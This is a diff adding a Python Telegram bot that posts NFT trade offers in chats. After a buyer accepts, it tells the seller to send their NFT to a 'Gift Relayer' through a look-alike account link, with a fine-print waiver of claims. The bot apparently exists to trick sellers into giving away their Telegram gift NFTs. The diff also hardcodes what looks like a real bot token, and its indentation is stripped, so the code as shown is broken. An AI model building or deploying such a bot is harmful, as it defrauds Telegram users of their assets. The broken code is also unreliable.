@@ -1,0 +1,131 @@
+import asyncio
+import logging
+from aiogram import Bot, Dispatcher, types, F
+from aiogram.filters import Command
+from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, Message
+from aiogram.enums import ParseMode
+
+# Твой токен от BotFather
+BOT_TOKEN = "8696532780:AAHMRIDBVm2j6XEgxN8-gjRdSUv_w3R_oDM"
+
+# Ссылка на панель передачи NFT (замени ТВОЙ_АККАУНТ на нужный ник без @)
+GIFT_RELAYER_URL = "https://t.me/Gifl_relayer?gift=1"
+
+logging.basicConfig(level=logging.INFO)
+bot = Bot(token=BOT_TOKEN)
+dp = Dispatcher()
+
+# Хранилище активных сделок
+deals_db = {}
+
+@dp.message(Command("start"))
+async def cmd_start(message: Message):
+await message.answer("Бот запущен. Пиши /ar в чате, чтобы создать оффер.")
+
+# Обработка команды /ar (создание оффера)
+@dp.message(Command("ar"))
+async def create_offer(message: Message):
+if message.chat.type not in ["private", "group", "supergroup"]:
+return
+
+args = message.text.split()
+if len(args) < 4:
+await message.reply("Формат: /ar ССЫЛКА_НА_НФТ ЦЕНА ВАЛЮТА [ЯЗЫК]")
+return
+
+nft_link = args[1]
+price = args[2]
+currency = args[3]
+lang = args[4] if len(args) > 4 else "ru"
+
+# Удаляем команду /ar
+try:
+await message.delete()
+except Exception:
+pass
+
+# Создаем кнопки БЕЗ СМАЙЛИКОВ
+keyboard = InlineKeyboardMarkup(inline_keyboard=[
+[
+InlineKeyboardButton(text="Принять", callback_data=f"accept_{message.message_id}"),
+InlineKeyboardButton(text="Отклонить", callback_data=f"decline_{message.message_id}")
+]
+])
+
+text = (
+f"🛒 **Новый оффер!**\n\n"
+f"🎁 **Предмет:** {nft_link}\n"
+f"💰 **Цена:** {price} {currency}\n"
+f"🌐 **Язык:** {lang}"
+)
+
+sent_msg = await message.answer(text, reply_markup=keyboard, parse_mode=ParseMode.MARKDOWN)
+
+# Сохраняем данные
+deals_db[sent_msg.message_id] = {
+"seller": message.from_user.id,
+"buyer": None,
+"price": price,
+"currency": currency,
+"nft_link": nft_link,
+"status": "active"
+}
+
+# Обработка нажатия на кнопку "Принять"
+@dp.callback_query(F.data.startswith("accept_"))
+async def accept_offer(callback: types.CallbackQuery):
+msg_id = int(callback.data.split("_")[1])
+
+if msg_id not in deals_db or deals_db[msg_id]["status"] != "active":
+await callback.answer("Сделка уже неактивна.", show_alert=True)
+return
+
+deal = deals_db[msg_id]
+deal["buyer"] = callback.from_user.id
+deal["status"] = "accepted"
+
+new_text = (
+f"🤝 **Сделка заключена!**\n\n"
+f"🎁 **Предмет:** {deal['nft_link']}\n"
+f"💰 **Цена:** {deal['price']} {deal['currency']}\n\n"
+f"👤 **Покупатель:** @{callback.from_user.username}\n\n"
+f"⚠️ **Для поступления stats на баланс Telegram, отправьте NFT на Gift Relayer**\n\n"
+f"———————\n"
+f"*при нажатии кнопки принять вы освобождаете покупателя от претензий с вашей стороны*"
+)
+
+# Кнопка БЕЗ СМАЙЛИКА
+keyboard = InlineKeyboardMarkup(inline_keyboard=[
+[InlineKeyboardButton(text="Передать NFT", url=GIFT_RELAYER_URL)]
+])
+
+await callback.message.edit_text(new_text, reply_markup=keyboard, parse_mode=ParseMode.MARKDOWN)
+await callback.answer("Оффер принят!")
+
+# Обработка нажатия на кнопку "Отклонить"
+@dp.callback_query(F.data.startswith("decline_"))
+async def decline_offer(callback: types.CallbackQuery):
+msg_id = int(callback.data.split("_")[1])
+
+if msg_id not in deals_db or deals_db[msg_id]["status"] != "active":
+await callback.answer("Сделка уже неактивна.", show_alert=True)
+return
+
+deal = deals_db[msg_id]
+deal["status"] = "declined"
+
+new_text = (
+f"❌ **Предложение отклонено.**\n\n"
+f"🎁 **Предмет:** {deal['nft_link']}\n"
+f"💰 **Цена:** {deal['price']} {deal['currency']}"
+)
+
+await callback.message.edit_text(new_text, reply_markup=None, parse_mode=ParseMode.MARKDOWN)
+await callback.answer("Вы отклонили предложение.")
+
+async def main():
+print("Бот запущен...")
+await dp.start_polling(bot)
+
+if __name__ == "__main__":
+asyncio.run(main())
